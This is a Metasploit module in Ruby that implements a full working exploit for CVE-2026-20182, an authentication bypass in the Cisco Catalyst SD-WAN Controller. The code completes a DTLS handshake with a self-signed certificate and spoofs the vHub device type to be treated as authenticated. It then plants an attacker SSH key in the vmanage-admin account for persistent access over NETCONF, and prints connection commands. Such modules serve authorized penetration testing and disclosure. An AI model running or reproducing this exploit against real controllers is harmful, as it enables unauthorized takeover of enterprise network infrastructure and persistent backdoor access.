# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'fiddle'
require 'ipaddr'
require 'base64'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco Catalyst SD-WAN Controller vHub Authentication Bypass',
        'Description' => %q{
          This module exploits an authentication bypass vulnerability (CVE-2026-20182)
          in the Cisco Catalyst SD-WAN Controller. The vdaemon DTLS control-plane
          service performs no certificate or credential verification for connecting peers
          that claim to be a vHub (device type 2). The vbond_proc_challenge_ack() function
          implements device-type-specific verification through a series of conditional
          blocks, but contains no code path for device type 2 (vHub). After a DTLS
          handshake using any self-signed certificate, an attacker sends a CHALLENGE_ACK
          (msg_type=9) with the vHub device type encoded in the protocol header. The
          function falls through all verification checks and unconditionally sets
          peer->authenticated = 1.

          This module leverages the authentication bypass to inject an attacker-controlled
          SSH public key into the vmanage-admin user's authorized_keys file via a
          VMANAGE_TO_PEER message (msg_type=14), providing persistent SSH access to the
          controller over the NETCONF service (TCP port 830).

          Affected versions: Cisco Catalyst SD-WAN Controller 20.12.6.1 and earlier.
          Consult Cisco's security advisory for a complete list of affected versions
          and patches.
        },
        'Author' => [
          'sfewer-r7', # Vulnerability discovery
          'Crypto-Cat', # Vulnerability discovery and Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-20182'],
          ['URL', 'https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-rpa2-v69WY2SW'], # Vendor advisory
          ['URL', 'https://blog.talosintelligence.com/sd-wan-ongoing-exploitation/'], # Talos blog
          ['URL', 'https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/'] # Rapid7 blog
        ],
        'DisclosureDate' => '2026-05-07',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(12346),
        OptInt.new('DOMAIN_ID', [true, 'SD-WAN domain ID', 1]),
        OptInt.new('SITE_ID', [true, 'SD-WAN site ID', 100]),
        OptPath.new('SSH_PUBLIC_KEY_FILE', [false, 'Path to an existing SSH public key file to inject'])
      ]
    )
  end

  def check
    result = perform_auth_bypass(ssh_key_inject: false, silent: !datastore['VERBOSE'])
    if result == :vulnerable
      Msf::Exploit::CheckCode::Vulnerable('Authentication bypass succeeded - vHub CHALLENGE_ACK accepted without verification')
    elsif result == :detected
      Msf::Exploit::CheckCode::Detected('DTLS service detected but bypass could not be confirmed')
    else
      Msf::Exploit::CheckCode::Unknown('Could not determine vulnerability status')
    end
  rescue ::StandardError => e
    vprint_error("Check failed: #{e.message}")
    Msf::Exploit::CheckCode::Unknown("Check failed: #{e.message}")
  end

  def run
    result = perform_auth_bypass(ssh_key_inject: true, silent: false)
    if result == :vulnerable
      report_vuln(
        host: rhost,
        port: rport,
        proto: 'udp',
        name: name,
        info: 'Authentication bypass confirmed - vHub CHALLENGE_ACK accepted without verification',
        refs: references
      )
      print_good('Authentication bypass and SSH key injection completed!')
    else
      fail_with(Failure::UnexpectedReply, 'Exploit failed')
    end
  end

  private

  def perform_auth_bypass(ssh_key_inject:, silent: false)
    ssl = nil
    ctx = nil
    udp_sock = nil

    begin
      # Phase 1: DTLS handshake
      ssl, ctx, udp_sock, rbio, wbio = phase1_dtls_handshake(silent: silent)
      return :safe unless ssl

      # Phase 2: Receive CHALLENGE
      return :detected unless phase2_receive_challenge(ssl, rbio, wbio, udp_sock, silent: silent)

      # Phase 3: Send CHALLENGE_ACK (the bypass)
      return :detected unless phase3_send_challenge_ack(ssl, rbio, wbio, udp_sock, silent: silent)

      # Phase 4: Observe result
      return :detected unless phase4_observe_result(ssl, rbio, wbio, udp_sock, silent: silent)

      # Phase 5: Send Hello
      return :detected unless phase5_send_hello(ssl, rbio, wbio, udp_sock, silent: silent)

      # Phase 6: SSH key injection
      phase6_ssh_key_inject(ssl, rbio, wbio, udp_sock, silent: silent) if ssh_key_inject

      :vulnerable
    ensure
      cleanup_dtls(ssl, ctx, udp_sock)
    end
  end

  def phase1_dtls_handshake(silent: false)
    print_status('Phase 1: DTLS handshake with self-signed certificate') unless silent

    load_openssl_ffi

    # Generate self-signed certificate (in-memory, no files written to disk)
    cert_der, key_der = generate_self_signed_cert

    # Create UDP socket
    udp_sock = Rex::Socket::Udp.create(
      'PeerHost' => rhost,
      'PeerPort' => rport,
      'Context' => { 'Msf' => framework, 'MsfExploit' => self }
    )

    # Create DTLS context
    method_ptr = @f_dtls_client_method.call
    fail_with(Failure::Unknown, 'DTLS_client_method() returned NULL') if method_ptr.null?

    ctx = @f_ssl_ctx_new.call(method_ptr)
    fail_with(Failure::Unknown, 'SSL_CTX_new() returned NULL') if ctx.null?

    # Disable peer certificate verification
    @f_ssl_ctx_set_verify.call(ctx, SSL_VERIFY_NONE, Fiddle::NULL)

    # Load certificate and key from in-memory DER data
    ret = @f_ssl_ctx_use_certificate_asn1.call(ctx, cert_der.bytesize, cert_der)
    fail_with(Failure::Unknown, "SSL_CTX_use_certificate_ASN1 failed (ret=#{ret})") unless ret == 1

    ret = @f_ssl_ctx_use_privatekey_asn1.call(EVP_PKEY_RSA, ctx, key_der, key_der.bytesize)
    fail_with(Failure::Unknown, "SSL_CTX_use_PrivateKey_ASN1 failed (ret=#{ret})") unless ret == 1

    # Create SSL object
    ssl = @f_ssl_new.call(ctx)
    fail_with(Failure::Unknown, 'SSL_new() returned NULL') if ssl.null?

    # Create memory BIOs
    mem_method = @f_bio_s_mem.call
    rbio = @f_bio_new.call(mem_method)
    wbio = @f_bio_new.call(mem_method)
    fail_with(Failure::Unknown, 'BIO_new() returned NULL') if rbio.null? || wbio.null?

    # Attach BIOs to SSL (SSL takes ownership)
    @f_ssl_set_bio.call(ssl, rbio, wbio)

    # Perform DTLS handshake
    do_dtls_handshake(ssl, rbio, wbio, udp_sock)

    print_status('DTLS handshake succeeded (self-signed cert accepted)') unless silent

    [ssl, ctx, udp_sock, rbio, wbio]
  rescue ::Rex::ConnectionError, ::Errno::ECONNREFUSED => e
    print_error("Connection failed: #{e.message}") unless silent
    cleanup_dtls(ssl, ctx, udp_sock)
    [nil, nil, nil, nil, nil]
  rescue Fiddle::DLError => e
    print_error("OpenSSL FFI error: #{e.message}") unless silent
    cleanup_dtls(ssl, ctx, udp_sock)
    [nil, nil, nil, nil, nil]
  end

  def phase2_receive_challenge(ssl, rbio, wbio, udp_sock, silent: false)
    print_status('Phase 2: Waiting for CHALLENGE from server') unless silent

    hdr, body = recv_message(ssl, rbio, wbio, udp_sock, timeout: 15)
    unless hdr
      print_error('No CHALLENGE received from server') unless silent
      return false
    end

    if hdr_msg_type(hdr) != MSG_CHALLENGE
      print_error("Expected CHALLENGE (type=#{MSG_CHALLENGE}), got #{msg_name(hdr_msg_type(hdr))} (type=#{hdr_msg_type(hdr)})") unless silent
      return false
    end

    print_status("CHALLENGE received (#{body.bytesize} bytes of challenge data)") unless silent
    true
  end

  def phase3_send_challenge_ack(ssl, _rbio, wbio, udp_sock, silent: false)
    print_status('Phase 3: Sending CHALLENGE_ACK as vHub (authentication bypass)') unless silent

    ack_body = build_challenge_ack_body
    send_message(ssl, wbio, udp_sock, MSG_CHALLENGE_ACK, ack_body)

    true
  end

  def phase4_observe_result(ssl, rbio, wbio, udp_sock, silent: false)
    print_status('Phase 4: Waiting for server response to CHALLENGE_ACK') unless silent

    hdr, _body = recv_message(ssl, rbio, wbio, udp_sock, timeout: 10)
    if hdr
      mtype = hdr_msg_type(hdr)
      if mtype == MSG_TEAR_DOWN
        print_warning('TEAR_DOWN received - server rejected the CHALLENGE_ACK') unless silent
        return false
      end
      print_status("Server responded with: #{msg_name(mtype)}") unless silent
    else
      print_warning('No immediate response (server may be waiting for our Hello)') unless silent
    end

    true
  end

  def phase5_send_hello(ssl, rbio, wbio, udp_sock, silent: false)
    print_status('Phase 5: Sending Hello as authenticated peer') unless silent

    hello_body = build_hello_body
    send_message(ssl, wbio, udp_sock, MSG_HELLO, hello_body)

    hdr, _body = recv_message(ssl, rbio, wbio, udp_sock, timeout: 10)
    if hdr
      mtype = hdr_msg_type(hdr)
      if mtype == MSG_HELLO
        print_good('Hello response received - authenticated as vHub peer') unless silent
        return true
      elsif mtype == MSG_TEAR_DOWN
        print_warning('TEAR_DOWN received after Hello') unless silent
      else
        print_warning("Server responded with: #{msg_name(mtype)}") unless silent
      end
    else
      print_warning('No Hello response') unless silent
    end

    false
  end

  def phase6_ssh_key_inject(ssl, rbio, wbio, udp_sock, silent: false)
    print_status('Phase 6: Injecting SSH public key into vmanage-admin authorized_keys') unless silent

    ssh_pubkey, ssh_privkey_pem = resolve_ssh_key(silent: silent)

    # Build SSH key injection body (769 bytes)
    key_body = build_ssh_inject_body(ssh_pubkey)

    send_message(ssl, wbio, udp_sock, MSG_VMANAGE_TO_PEER, key_body)

    if datastore['SSH_PUBLIC_KEY_FILE']
      # If we are using an existing key supplied by the user, just show how to connect to the NETCONF service.
      print_good("Use: ssh -i <SSH_PRIVATE_KEY_FILE> vmanage-admin@#{rhost} -p 830") unless silent
    else
      # Write SSH key file to loot
      privkey_path = store_loot(
        'cisco.sdwan.sshkey',
        'application/x-pem-file',
        rhost,
        ssh_privkey_pem,
        'sdwan_ssh_key.pem',
        'SSH private key for vmanage-admin access'
      )
      ::File.chmod(0o600, privkey_path)

      unless silent
        print_status("SSH private key saved to loot: #{privkey_path}")
        # Provide connection instructions
        print_good('Connect to NETCONF via:')
        print_line("ssh -i #{privkey_path} vmanage-admin@#{rhost} -p 830")
      end
    end

    # Check for response
    hdr, _body = recv_message(ssl, rbio, wbio, udp_sock, timeout: 5)
    if hdr
      mtype = hdr_msg_type(hdr)
      if mtype == MSG_REGISTER_TO_VMANAGE
        print_status('Server responded with: REGISTER_TO_VMANAGE (key has been injected)') unless silent
      else
        print_warning("Server responded with: #{msg_name(mtype)}") unless silent
      end
    else
      print_warning('No response to key injection') unless silent
    end
  end

  #
  # vdaemon protocol constants
  #

  MSG_HELLO = 0x05
  MSG_CHALLENGE = 0x08
  MSG_CHALLENGE_ACK = 0x09
  MSG_TEAR_DOWN = 0x0B
  MSG_REGISTER_TO_VMANAGE = 0x0D
  MSG_VMANAGE_TO_PEER = 0x0E

  # Device type encoded in the upper nibble of header byte 1.
  # Claiming vHub (type 2) causes vbond_proc_challenge_ack() to fall through
  # all verification branches and unconditionally set peer->authenticated = 1.
  DEV_VHUB = 2

  HDR_FLAGS = 0xA0

  TLV_UUID = 0x0006
  TLV_INSTANCE_ID = 0x0013
  TLV_MAX_INSTANCES = 0x0014
  TLV_FLAG_18 = 0x0018
  TLV_FLAG_19 = 0x0019
  TLV_SERVER_KEY = 0x0032
  TLV_NUM_VSMARTS = 0x0021
  TLV_NUM_VMANAGES = 0x0022

  MSG_NAMES = {
    0 => 'NEW_CHALLENGE_ACK',
    1 => 'Register',
    5 => 'Hello',
    7 => 'Data',
    8 => 'CHALLENGE',
    9 => 'CHALLENGE_ACK',
    10 => 'CHALLENGE_ACK_ACK',
    11 => 'TEAR_DOWN',
    12 => 'DELETE_VSMARTS_SERIAL',
    13 => 'REGISTER_TO_VMANAGE',
    14 => 'VMANAGE_TO_PEER',
    15 => 'submsg'
  }.freeze

  #
  # Protocol encoding/decoding
  #

  def build_header(msg_type)
    byte0 = msg_type & 0x0F
    byte1 = (DEV_VHUB & 0x0F) << 4
    domain_id = datastore['DOMAIN_ID']
    site_id = datastore['SITE_ID']
    [byte0, byte1, HDR_FLAGS, 0x00, domain_id, site_id].pack('CCCCN2')
  end

  def hdr_msg_type(hdr_bytes)
    hdr_bytes.getbyte(0) & 0x0F
  end

  def msg_name(type)
    MSG_NAMES.fetch(type) { format('Unknown(0x%02X)', type) }
  end

  def send_message(ssl, wbio, udp_sock, msg_type, body = ''.b)
    header = build_header(msg_type)
    message = header + body
    vprint_status("Sending #{msg_name(msg_type)} (#{message.bytesize} bytes)")
    dtls_send(ssl, wbio, udp_sock, message)
  end

  def recv_message(ssl, rbio, wbio, udp_sock, timeout: 10)
    data = dtls_recv(ssl, rbio, wbio, udp_sock, timeout: timeout)
    return [nil, nil] unless data
    return [nil, nil] if data.bytesize < 12

    hdr = data[0, 12]
    body = data[12..] || ''.b
    mtype = hdr_msg_type(hdr)
    vprint_status("Received #{msg_name(mtype)} (#{data.bytesize} bytes)")
    [hdr, body]
  end

  #
  # Message body builders
  #

  def build_challenge_ack_body
    uuid = format(
      '%<a>08x-%<b>04x-%<c>04x-%<d>04x-%<e>012x',
      a: rand(0xffffffff), b: rand(0xffff), c: rand(0xffff),
      d: rand(0xffff), e: rand(0xffffffffffff)
    )
    server_key = Rex::Text.rand_text_alphanumeric(32)

    tlvs = [
      build_tlv(TLV_INSTANCE_ID, [0].pack('n')),
      build_tlv(TLV_MAX_INSTANCES, [1].pack('n')),
      build_tlv(TLV_FLAG_18, [1].pack('C')),
      build_tlv(TLV_FLAG_19, [0].pack('C')),
      build_tlv(TLV_UUID, uuid),
      build_tlv(TLV_SERVER_KEY, server_key)
    ]

    buf = [0, 0].pack('CC') # verified_status=0, hardware_flag=0
    buf << [tlvs.size].pack('C')
    buf << tlvs.join
    buf
  end

  def build_hello_body
    buf = ''.b

    buf << [0x00, 0x00, 0x00, 0x00].pack('CCCC') # preamble, is_dummy=false
    buf << [0x0002].pack('n')                      # address family: AF_INET
    buf << IPAddr.new(rhost, Socket::AF_INET).hton # IP address
    buf << [rport].pack('n')                       # port
    buf << [1].pack('N')                           # color
    buf << ("\x00" * 20)                           # label/key padding

    buf << [10_000, 60_000].pack('N2') # hello_interval_ms, hello_tolerance_ms

    tlv_vsmarts = build_tlv(TLV_NUM_VSMARTS, [0x00].pack('C'))
    tlv_vmanages = build_tlv(TLV_NUM_VMANAGES, [0x00].pack('C'))
    buf << [2].pack('C')
    buf << tlv_vsmarts
    buf << tlv_vmanages

    buf
  end

  def build_tlv(type, value)
    [type, value.bytesize].pack('n2') + value.b
  end

  def build_ssh_inject_body(ssh_pubkey)
    # Leading newline ensures key appends cleanly regardless of whether
    # authorized_keys ends with a newline. Trailing newline for consistency.
    key_buf = "\n".b + ssh_pubkey.b
    key_buf << "\n".b unless key_buf.end_with?("\n".b)
    key_buf << "\x00".b # null-terminate for fputs()
    key_buf << ("\x00".b * (768 - key_buf.bytesize)) if key_buf.bytesize < 768
    key_buf << [0].pack('C') # TLV count = 0
    key_buf
  end

  #
  # Certificate and SSH key helpers
  #

  def generate_self_signed_cert
    key = OpenSSL::PKey::RSA.new(2048)
    cert = OpenSSL::X509::Certificate.new

    cert.version = 2
    cert.serial = rand(1..0xFFFFFFFF)
    cert.subject = OpenSSL::X509::Name.parse('/CN=/O=/C=')
    cert.issuer = cert.subject
    cert.public_key = key
    cert.not_before = Time.now - 60
    cert.not_after = Time.now + (365 * 86_400)

    cert.sign(key, OpenSSL::Digest.new('SHA256'))

    [cert.to_der, key.to_der]
  end

  def resolve_ssh_key(silent: false)
    if datastore['SSH_PUBLIC_KEY_FILE']
      pubkey = File.read(datastore['SSH_PUBLIC_KEY_FILE']).strip
      print_status("Using SSH public key from #{datastore['SSH_PUBLIC_KEY_FILE']}") unless silent
      return [pubkey, nil]
    end

    # Generate new RSA keypair
    print_status('Generating RSA 2048-bit SSH keypair') unless silent
    key = OpenSSL::PKey::RSA.new(2048)

    pubkey_str = build_openssh_pubkey(key)
    privkey_pem = key.to_pem

    [pubkey_str, privkey_pem]
  end

  def build_openssh_pubkey(key)
    e_bytes = bn_to_bytes(key.e)
    n_bytes = bn_to_bytes(key.n)

    # Prepend 0x00 if MSB is set (two's complement sign bit)
    e_bytes = "\x00".b + e_bytes if e_bytes.getbyte(0) & 0x80 != 0
    n_bytes = "\x00".b + n_bytes if n_bytes.getbyte(0) & 0x80 != 0

    blob = ssh_string('ssh-rsa') + ssh_string(e_bytes) + ssh_string(n_bytes)
    "ssh-rsa #{Base64.strict_encode64(blob)}"
  end

  def ssh_string(data)
    data = data.b if data.respond_to?(:b)
    [data.bytesize].pack('N') + data
  end

  def bn_to_bytes(bn)
    hex = bn.to_s(16)
    hex = "0#{hex}" if hex.length.odd?
    [hex].pack('H*')
  end

  #
  # DTLS transport via Fiddle (OpenSSL C API)
  #
  # Ruby's OpenSSL bindings do not support DTLS. We use Fiddle to call the
  # OpenSSL C API directly with memory BIOs to drive the DTLS 1.2 handshake.
  #

  # OpenSSL constants for Fiddle FFI
  SSL_VERIFY_NONE = 0
  EVP_PKEY_RSA = 6
  SSL_ERROR_WANT_READ = 2
  SSL_ERROR_WANT_WRITE = 3
  SSL_ERROR_ZERO_RETURN = 6
  BIO_CTRL_PENDING = 10
  DTLS_CTRL_HANDLE_TIMEOUT = 106

  HANDSHAKE_TIMEOUT = 5
  MAX_HANDSHAKE_RETRIES = 10
  RECV_BUF_SIZE = 65_536

  def load_openssl_ffi
    return if @ffi_loaded

    libssl = load_native_lib('ssl')
    libcrypto = load_native_lib('crypto')

    # libssl functions
    @f_dtls_client_method = bind_function(libssl, 'DTLS_client_method', [], Fiddle::TYPE_VOIDP)
    @f_ssl_ctx_new = bind_function(libssl, 'SSL_CTX_new', [Fiddle::TYPE_VOIDP], Fiddle::TYPE_VOIDP)
    @f_ssl_ctx_set_verify = bind_function(libssl, 'SSL_CTX_set_verify', [Fiddle::TYPE_VOIDP, Fiddle::TYPE_INT, Fiddle::TYPE_VOIDP], Fiddle::TYPE_VOID)
    @f_ssl_ctx_use_certificate_asn1 = bind_function(libssl, 'SSL_CTX_use_certificate_ASN1', [Fiddle::TYPE_VOIDP, Fiddle::TYPE_INT, Fiddle::TYPE_VOIDP], Fiddle::TYPE_INT)
    @f_ssl_ctx_use_privatekey_asn1 = bind_function(libssl, 'SSL_CTX_use_PrivateKey_ASN1', [Fiddle::TYPE_INT, Fiddle::TYPE_VOIDP, Fiddle::TYPE_VOIDP, Fiddle::TYPE_LONG], Fiddle::TYPE_INT)
    @f_ssl_new = bind_function(libssl, 'SSL_new', [Fiddle::TYPE_VOIDP], Fiddle::TYPE_VOIDP)
    @f_ssl_set_bio = bind_function(libssl, 'SSL_set_bio', [Fiddle::TYPE_VOIDP, Fiddle::TYPE_VOIDP, Fiddle::TYPE_VOIDP], Fiddle::TYPE_VOID)
    @f_ssl_connect = bind_function(libssl, 'SSL_connect', [Fiddle::TYPE_VOIDP], Fiddle::TYPE_INT)
    @f_ssl_read = bind_function(libssl, 'SSL_read', [Fiddle::TYPE_VOIDP, Fiddle::TYPE_VOIDP, Fiddle::TYPE_INT], Fiddle::TYPE_INT)
    @f_ssl_write = bind_function(libssl, 'SSL_write', [Fiddle::TYPE_VOIDP, Fiddle::TYPE_VOIDP, Fiddle::TYPE_INT], Fiddle::TYPE_INT)
    @f_ssl_get_error = bind_function(libssl, 'SSL_get_error', [Fiddle::TYPE_VOIDP, Fiddle::TYPE_INT], Fiddle::TYPE_INT)
    @f_ssl_free = bind_function(libssl, 'SSL_free', [Fiddle::TYPE_VOIDP], Fiddle::TYPE_VOID)
    @f_ssl_ctx_free = bind_function(libssl, 'SSL_CTX_free', [Fiddle::TYPE_VOIDP], Fiddle::TYPE_VOID)
    @f_ssl_ctrl = bind_function(libssl, 'SSL_ctrl', [Fiddle::TYPE_VOIDP, Fiddle::TYPE_INT, Fiddle::TYPE_LONG, Fiddle::TYPE_VOIDP], Fiddle::TYPE_LONG)

    # libcrypto functions
    @f_bio_new = bind_function(libcrypto, 'BIO_new', [Fiddle::TYPE_VOIDP], Fiddle::TYPE_VOIDP)
    @f_bio_s_mem = bind_function(libcrypto, 'BIO_s_mem', [], Fiddle::TYPE_VOIDP)
    @f_bio_read = bind_function(libcrypto, 'BIO_read', [Fiddle::TYPE_VOIDP, Fiddle::TYPE_VOIDP, Fiddle::TYPE_INT], Fiddle::TYPE_INT)
    @f_bio_write = bind_function(libcrypto, 'BIO_write', [Fiddle::TYPE_VOIDP, Fiddle::TYPE_VOIDP, Fiddle::TYPE_INT], Fiddle::TYPE_INT)
    @f_bio_ctrl = bind_function(libcrypto, 'BIO_ctrl', [Fiddle::TYPE_VOIDP, Fiddle::TYPE_INT, Fiddle::TYPE_LONG, Fiddle::TYPE_VOIDP], Fiddle::TYPE_LONG)
    @f_err_clear_error = bind_function(libcrypto, 'ERR_clear_error', [], Fiddle::TYPE_VOID)
    @f_err_get_error = bind_function(libcrypto, 'ERR_get_error', [], Fiddle::TYPE_LONG)
    @f_err_error_string_n = bind_function(libcrypto, 'ERR_error_string_n', [Fiddle::TYPE_LONG, Fiddle::TYPE_VOIDP, Fiddle::TYPE_SIZE_T], Fiddle::TYPE_VOID)

    @recv_buf = Fiddle::Pointer.malloc(RECV_BUF_SIZE, Fiddle::RUBY_FREE)
    @ffi_loaded = true

    vprint_status('OpenSSL FFI bindings loaded successfully')
  end

  def load_native_lib(name)
    candidates = case RUBY_PLATFORM
                 when /mingw|mswin|cygwin/
                   bin = RbConfig::CONFIG['bindir']
                   arch_dir = RbConfig::CONFIG['archdir']
                   site_arch = RbConfig::CONFIG['sitearchdir']
                   paths = []
                   [arch_dir, site_arch, bin].compact.uniq.each do |dir|
                     paths << "#{dir}/lib#{name}-3-x64.dll"
                     paths << "#{dir}/lib#{name}-3.dll"
                     paths << "#{dir}/lib#{name}-1_1-x64.dll"
                   end
                   paths += %W[lib#{name}-3-x64 lib#{name}-3 lib#{name}]
                   paths
                 when /darwin/
                   %W[
                     /usr/local/opt/openssl@3/lib/lib#{name}.3.dylib
                     /usr/local/opt/openssl/lib/lib#{name}.dylib
                     /opt/homebrew/opt/openssl@3/lib/lib#{name}.3.dylib
                     /opt/homebrew/opt/openssl/lib/lib#{name}.dylib
                     /opt/local/lib/lib#{name}.3.dylib
                     /opt/local/lib/lib#{name}.dylib
                   ]
                 else
                   %W[
                     lib#{name}.so.3
                     lib#{name}.so.1.1
                     lib#{name}.so
                   ]
                 end

    candidates.each do |path|
      next if path.start_with?('/') && !File.exist?(path)

      return Fiddle.dlopen(path)
    rescue Fiddle::DLError
      next
    end
    fail_with(Failure::NotFound, "Cannot find lib#{name}. Ensure OpenSSL is installed.")
  end

  def bind_function(lib, name, args, ret)
    Fiddle::Function.new(lib[name], args, ret)
  end

  def bio_ctrl_pending(bio)
    @f_bio_ctrl.call(bio, BIO_CTRL_PENDING, 0, Fiddle::NULL)
  end

  def handle_dtls_timeout(ssl)
    @f_ssl_ctrl.call(ssl, DTLS_CTRL_HANDLE_TIMEOUT, 0, Fiddle::NULL)
  end

  def drain_openssl_errors
    msgs = []
    loop do
      code = @f_err_get_error.call
      break if code == 0

      buf = Fiddle::Pointer.malloc(256, Fiddle::RUBY_FREE)
      @f_err_error_string_n.call(code, buf, 256)
      msgs << buf.to_s
    end
    msgs
  end

  # Drive the DTLS handshake state machine, shuttling data between the
  # SSL engine and the UDP socket via memory BIOs.
  def do_dtls_handshake(ssl, rbio, wbio, udp_sock)
    retries = 0

    loop do
      @f_err_clear_error.call
      ret = @f_ssl_connect.call(ssl)
      flush_wbio(wbio, udp_sock)

      break if ret == 1

      err = @f_ssl_get_error.call(ssl, ret)
      case err
      when SSL_ERROR_WANT_READ
        ready = ::IO.select([udp_sock], nil, nil, HANDSHAKE_TIMEOUT)
        if ready
          begin
            dgram = udp_sock.recvfrom(65_536)[0]
            @f_bio_write.call(rbio, dgram, dgram.bytesize)
          rescue ::IO::WaitReadable
            retries += 1
            fail_with(Failure::Unreachable, "DTLS handshake timeout after #{retries} retries") if retries > MAX_HANDSHAKE_RETRIES

            handle_dtls_timeout(ssl)
            flush_wbio(wbio, udp_sock)
          end
        else
          retries += 1
          fail_with(Failure::Unreachable, "DTLS handshake timeout after #{retries} retries") if retries > MAX_HANDSHAKE_RETRIES

          handle_dtls_timeout(ssl)
          flush_wbio(wbio, udp_sock)
        end
      when SSL_ERROR_WANT_WRITE
        flush_wbio(wbio, udp_sock)
      else
        errors = drain_openssl_errors
        fail_with(Failure::Unknown, "DTLS handshake failed (SSL error #{err}): #{errors.join('; ')}")
      end
    end
  end

  def flush_wbio(wbio, udp_sock)
    loop do
      pending = bio_ctrl_pending(wbio)
      break if pending <= 0

      buf = Fiddle::Pointer.malloc(pending, Fiddle::RUBY_FREE)
      n = @f_bio_read.call(wbio, buf, pending)
      break if n <= 0

      udp_sock.write(buf.to_str(n))
    end
  end

  def dtls_send(ssl, wbio, udp_sock, data)
    @f_err_clear_error.call
    ret = @f_ssl_write.call(ssl, data, data.bytesize)
    if ret <= 0
      err = @f_ssl_get_error.call(ssl, ret)
      errors = drain_openssl_errors
      fail_with(Failure::Unknown, "SSL_write failed (error #{err}): #{errors.join('; ')}")
    end
    flush_wbio(wbio, udp_sock)
    ret
  end

  def dtls_recv(ssl, rbio, _wbio, udp_sock, timeout: 10)
    ready = ::IO.select([udp_sock], nil, nil, timeout)
    return nil unless ready

    begin
      dgram = udp_sock.recvfrom(65_536)[0]
    rescue ::IO::WaitReadable
      return nil
    end

    @f_bio_write.call(rbio, dgram, dgram.bytesize)

    @f_err_clear_error.call
    ret = @f_ssl_read.call(ssl, @recv_buf, RECV_BUF_SIZE)
    if ret <= 0
      err = @f_ssl_get_error.call(ssl, ret)
      return nil if err == SSL_ERROR_WANT_READ

      vprint_status("SSL_read error: #{err}")
      return nil
    end

    @recv_buf.to_str(ret).b
  end

  def cleanup_dtls(ssl, ctx, udp_sock)
    if ssl
      begin
        @f_ssl_free.call(ssl)
      rescue ::StandardError
        nil
      end
    end

    if ctx
      begin
        @f_ssl_ctx_free.call(ctx)
      rescue ::StandardError
        nil
      end
    end

    begin
      udp_sock&.close
    rescue ::StandardError
      nil
    end
  end
end
